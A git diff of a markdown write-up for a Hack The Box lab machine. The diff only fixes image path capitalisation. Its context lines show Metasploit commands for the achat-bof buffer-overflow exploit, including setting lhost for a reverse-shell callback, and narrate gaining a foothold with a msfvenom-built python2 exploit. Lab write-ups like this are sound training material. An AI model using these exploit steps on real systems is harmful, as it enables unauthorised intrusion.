@@ -28,7 +28,7 @@ msf6 > use exploit/windows/misc/achat-bof
 msf6 exploit(windows/misc/achat-bof) > show targets
 ```
 
-![pic4metaspoit](/Images/HTB2Chat/Pic4metasploit.png)
+![pic4metaspoit](/Images/HTB2Chat/pic4metasploit.png)
 
 And look at that, the version number.  And it just happens to match the exploit I found.  So lets give it a go.
 
@@ -40,17 +40,17 @@ msf6 exploit(windows/misc/achat-bof) > set lhost <my vpn ip>
 msf6 exploit(windows/misc/achat-bof) > show options
 ```
 
-![pic5metasploit](/Images/HTB2Chat/Pic5metasploit.png)
+![pic5metasploit](/Images/HTB2Chat/pic5metasploit.png)
 
 `msf6 exploit(windows/misc/achat-bof) > run`
 
 And it.....wait, it failed?!  Huh.  Ok, well let's try a different way.  So I found a couple things on git hub about using a buffer overflow for this.  It required using msfvenom in order to build out the vulnverability.  After finding that and getting it figured out (including finding out that these exploits were written in python2 and not python3), and a machine reset, I was finally able to get my exploit going for initial foothold.
 
-![pic6cmd](/Images/HTB2Chat/Pic6cmd.png)
+![pic6cmd](/Images/HTB2Chat/pic6cmd.png)
 
 Hey hey!!  That did the trick.  Now that we're in as the user, lets go ahead and grab his flag.
 
-![pic7userflag](/Images/HTB2Chat/Pic7userflag.png)
+![pic7userflag](/Images/HTB2Chat/pic7userflag.png)
 
 Now that I have that, let's get to getting the root one.
 
